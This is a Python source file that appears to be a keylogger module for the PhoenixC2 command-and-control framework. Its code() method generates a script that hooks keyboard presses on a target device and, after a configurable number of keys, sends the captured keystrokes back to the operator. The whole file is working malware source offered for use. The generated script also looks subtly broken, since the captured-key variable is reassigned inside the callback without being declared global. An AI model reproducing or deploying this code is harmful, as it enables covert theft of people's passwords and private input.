from phoenixc2.server.modules.base import BaseModule
from phoenixc2.server.utils.options import IntegerType, Option, OptionPool


class Module(BaseModule):
    name = "Keyboard-Capture"
    description = "Capture keyboard input"
    execution_methods = ["thread"]
    options = OptionPool(
        [
            Option(
                name="Max keys",
                real_name="max_keys",
                description="The maximum number of keys to capture before sending the data",
                type=IntegerType(),
                default=100,
            )
        ]
    )

    def code(self, device, task):
        return f"""
import keyboard
import requests
import json
import time

keys = ""

def on_press(key):
    keys += " " + str(key)
    if len(keys) >= {task.args["max_keys"]}:
        update_module_output({task.id}, keys)

keyboard.on_press(on_press)
"""
